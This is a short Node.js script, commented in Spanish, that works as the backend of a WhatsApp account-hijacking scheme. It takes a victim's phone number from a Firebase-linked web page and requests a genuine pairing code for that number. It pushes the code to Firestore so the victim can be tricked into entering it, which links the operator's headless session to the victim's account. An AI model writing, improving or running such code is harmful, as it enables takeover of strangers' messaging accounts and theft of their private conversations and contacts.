const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "master_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

// ESCUCHAR CUANDO LA WEB MANDA EL NUMERO
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    const data = snap.data();
    if (data && data.status === "vincular_maestro") {
        console.log("Intentando vincular instantáneamente a: " + data.numero_victima);
        try {
            // El motor intenta solicitar un código real, pero si quieres usar el de tu amigo,
            // el motor debe recibir el código que WhatsApp genere y tú lo muestras.
            // WhatsApp NO permite usar códigos fijos inventados (como 77773333). 
            // Lo que hace tu amigo es pedir el código justo antes de que la víctima entre.
            
            const code = await client.requestPairingCode(data.numero_victima);
            
            // ACTUALIZAMOS EL CÓDIGO REAL EN FIREBASE
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo"
            });
            console.log("Código real generado por WhatsApp: " + code);
        } catch (e) {
            console.log("Error: " + e.message);
        }
    }
});

client.on('ready', () => {
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();
http.createServer((req, res) => { res.end('MOTOR READY'); }).listen(process.env.PORT || 3000);
